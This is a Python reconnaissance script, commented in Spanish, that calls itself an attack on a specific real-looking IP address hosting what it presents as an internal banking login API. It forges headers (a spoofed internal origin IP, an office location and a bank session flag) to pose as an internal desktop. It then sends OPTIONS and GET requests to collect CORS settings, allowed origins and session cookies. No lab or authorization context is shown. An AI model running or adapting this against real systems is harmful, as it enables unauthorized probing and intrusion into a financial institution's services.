import requests

# URL interna que estás atacando
url = "http://80.78.30.242:9181/api/login/"

# Headers realistas y fingidos como si fueramos una pc de escritorio interna
headers = {
    "Host": "api.coretransapi.com",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (Internal Browser)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Ch-Ua": '"Brave";v="122", "Chromium";v="122", "Not=A?Brand";v="24"',
    "Sec-Ch-Ua-Mobile": '?0',
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Sec-Fetch-User": '?1',
    "Sec-Fetch-Site": 'same-origin',
    "Sec-Fetch-Mode": 'navigate',
    "Sec-Fetch-Dest": 'document',
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-ES-MADRID-9181",
    "X-Banco-Session": "1"
}

# === Iniciar sesión y obtener headers de respuesta ===
session = requests.Session()
response = session.options(url, headers=headers)

print("\n\n[+] HEADERS del sistema (preflight info):")
# Imprimir los que el endpoint responde en opciones
for k, v in response.headers.items():
    print(f"{k}: {v}")

if "Access-Control-Allow-Headers" in response.headers:
    allowed_headers = response.headers["Access-Control-Allow-Headers"]
    print("\n[+] Headers permitidos por el backend:", allowed_headers)

if "Access-Control-Allow-Origin" in response.headers:
    print("\n[+] Origenes permitidos:", response.headers["Access-Control-Allow-Origin"])

# === Hacer un get con headers reales, para ver que manda ===
csrf_get = session.get(url, headers=headers)

print("\n\n[+] Respuesta de GET a login:", csrf_get.text)
print("Status:", csrf_get.status_code)
print("Cookies:", session.cookies.get_dict())
